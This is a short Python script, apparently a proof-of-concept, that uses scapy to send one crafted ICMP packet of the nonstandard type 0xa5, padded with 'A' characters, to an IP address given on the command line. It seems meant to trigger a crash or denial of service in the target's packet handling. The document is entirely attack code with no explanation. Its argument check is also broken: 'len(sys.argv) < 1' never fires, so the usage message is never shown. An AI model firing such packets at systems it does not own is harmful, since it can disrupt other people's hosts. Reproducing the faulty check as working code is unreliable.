try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")

import sys

def main():
    if len(sys.argv) < 1:
        print(f"Usage:\n\tsudo {sys.argv[0]} 1.2.3.4")
        sys.exit(1)
    target = sys.argv[1]
    p = send(IP(dst=target)/ICMP(type=0xa5, code=0)/"AAAAAAAAAAAAAAAAAA"*2)

if __name__ == '__main__':
    main()
